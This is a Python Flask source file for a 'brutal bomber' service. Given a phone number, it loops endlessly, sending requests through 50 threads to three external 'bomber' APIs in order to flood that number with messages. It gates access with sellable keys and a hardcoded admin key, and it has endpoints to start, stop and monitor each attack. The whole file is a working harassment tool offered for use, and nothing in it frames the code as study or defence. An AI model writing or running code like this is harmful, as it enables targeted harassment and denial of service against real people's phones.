from flask import Flask, request, jsonify
import requests
import time
import secrets
import threading
import os  # <--- IMPORTANT
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# ====== KEY SYSTEM ======
DEFAULT_KEY = "admin123"
keys_db = {}

def generate_key(duration_hours=24):
    key = secrets.token_hex(16)
    keys_db[key] = {
        "created": datetime.now().isoformat(),
        "expires": (datetime.now() + timedelta(hours=duration_hours)).isoformat(),
        "active": True
    }
    return key

def validate_key(key):
    if key == DEFAULT_KEY:
        return True
    if key not in keys_db or not keys_db[key]["active"]:
        return False
    if datetime.now() > datetime.fromisoformat(keys_db[key]["expires"]):
        keys_db[key]["active"] = False
        return False
    return True

# ====== 3 APIS ======
THREE_APIS = [
    {"name": "Ultra", "url": "https://ultra-brutal-bomber.onrender.com/bomb", "params": {"phone": "{num}"}},
    {"name": "Part1", "url": "https://bomber-part-1.onrender.com/bomb", "params": {"phone": "{num}"}},
    {"name": "Part2", "url": "https://brutal-bomber-part-2.onrender.com/bomb", "params": {"phone": "{num}"}}
]

# ====== INFINITE BOMBER ======
class InfiniteBomber:
    def __init__(self, phone, key, threads=50, delay=0.005):
        self.phone = phone
        self.key = key
        self.threads = threads
        self.delay = delay
        self.running = True
        self.success = 0
        self.failed = 0
        self.start_time = time.time()
    
    def _send(self, api):
        if not self.running:
            return False
        time.sleep(self.delay)
        try:
            params = api["params"].copy()
            for k, v in params.items():
                if "{num}" in v:
                    params[k] = v.replace("{num}", self.phone)
            resp = requests.get(api["url"], params=params, timeout=10)
            return resp.status_code == 200
        except:
            return False
    
    def start(self):
        self.running = True
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            while self.running:
                futures = [ex.submit(self._send, api) for api in THREE_APIS * 2]
                for f in as_completed(futures):
                    if not self.running:
                        break
                    if f.result():
                        self.success += 1
                    else:
                        self.failed += 1
                elapsed = int(time.time() - self.start_time)
                rate = self.success / elapsed if elapsed > 0 else 0
                print(f"✅ {self.success} | ❌ {self.failed} | ⚡ {rate:.1f}/s")
    
    def stop(self):
        self.running = False
    
    def stats(self):
        elapsed = int(time.time() - self.start_time)
        return {
            "phone": self.phone,
            "success": self.success,
            "failed": self.failed,
            "total": self.success + self.failed,
            "time": elapsed,
            "speed": f"{self.success/elapsed:.1f}/s" if elapsed > 0 else "N/A"
        }

active_bombers = {}

# ====== API ENDPOINTS ======

@app.route('/')
def home():
    return {"status": "🔥 BRUTAL BOMBER 🔥", "apis": [a["name"] for a in THREE_APIS]}

@app.route('/bomb')
def bomb():
    phone = request.args.get('phone')
    key = request.args.get('key')
    if not key or not validate_key(key):
        return jsonify({"error": "Invalid key"}), 401
    if not phone or len(phone) != 10:
        return jsonify({"error": "10 digit phone"}), 400
    
    bid = f"{phone}_{int(time.time())}"
    bomber = InfiniteBomber(phone, key)
    active_bombers[bid] = bomber
    threading.Thread(target=lambda: bomber.start()).start()
    return jsonify({"status": "started", "bomber_id": bid})

@app.route('/stop')
def stop():
    bid = request.args.get('bomber_id')
    if not bid:
        return jsonify({"error": "bomber_id required"}), 400
    if bid in active_bombers:
        active_bombers[bid].stop()
        stats = active_bombers[bid].stats()
        del active_bombers[bid]
        return jsonify({"status": "stopped", "stats": stats})
    return jsonify({"error": "Not found"}), 404

@app.route('/status')
def status():
    bid = request.args.get('bomber_id')
    if not bid:
        return jsonify({"active": list(active_bombers.keys())})
    if bid in active_bombers:
        return jsonify({"status": "running", "stats": active_bombers[bid].stats()})
    return jsonify({"error": "Not found"}), 404

@app.route('/keygen', methods=['POST'])
def keygen():
    data = request.get_json() or {}
    if data.get('admin_key') != DEFAULT_KEY:
        return jsonify({"error": "Invalid admin key"}), 401
    key = generate_key(data.get('duration', 24))
    return jsonify({"key": key, "expires": keys_db[key]["expires"]})

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "apis": len(THREE_APIS), "keys": len(keys_db)})

# ====== MAIN ======
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # <--- FIXED
    app.run(host='0.0.0.0', port=port)
